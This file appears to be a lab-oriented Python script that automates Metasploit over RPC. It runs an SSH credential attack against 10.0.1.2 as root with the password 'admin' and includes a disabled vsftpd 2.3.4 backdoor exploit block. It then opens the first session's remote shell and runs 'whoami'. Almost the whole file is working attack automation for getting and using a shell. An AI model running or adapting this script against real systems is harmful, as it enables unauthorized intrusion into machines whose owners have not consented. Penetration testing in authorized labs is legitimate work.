# $ msfconsole
# msf> load msgrpc Pass=test111

#[*] MSGRPC Service:  127.0.0.1:55552 
#[*] MSGRPC Username: msf
#[*] MSGRPC Password: T5X5iBLk
#[*] Successfully loaded plugin: msgrpc

from pymetasploit3.msfrpc import MsfRpcClient
import time

passwd = 'test111'

client = MsfRpcClient(passwd, port=55552)

#print([m for m in dir(client) if not m.startswith('_')])

#print(client.modules.exploits)

# select exploit

if True:
    pass
print("###################### ssh login #######################")

aux = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')

# 'scanner/ssh/ssh_login_pubkey'

print(aux.description)
print()
print(aux.options)

#aux['RHOSTS'] = '10.0.1.1'
aux['RHOSTS'] = '10.0.1.2'
#aux['RHOSTS'] = '10.0.1.8'
aux['RPORT'] = '22'
aux['USERNAME'] = 'root'
aux['PASSWORD'] = 'admin'
aux['VERBOSE'] = True
aux['GatherProof'] = False

print(aux.missing_required)  # useful to check which mandatory option has not been set

print(aux.execute())


if False:
    print("##################### backdoor ########################")

    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

    print(exploit.options)
    print(exploit.missing_required)
    print(exploit.targetpayloads())

# Get session id

# Get all sessions
# Find all available sessions
print("Sessions availables: ")
print(client.sessions.list)
for s in client.sessions.list.keys():
	print(s)


# Get a shell object
shell = client.sessions.session(list(client.sessions.list.keys())[0])

# Write to the shell
shell.write('whoami')

# Print the output
print(shell.read())

# Stop the shell
shell.stop()

#session_command = 'wget www.google.com'
#terminating_strs = '200'

#client.sessions.session(session_id).run_with_output(session_command, terminating_strs)


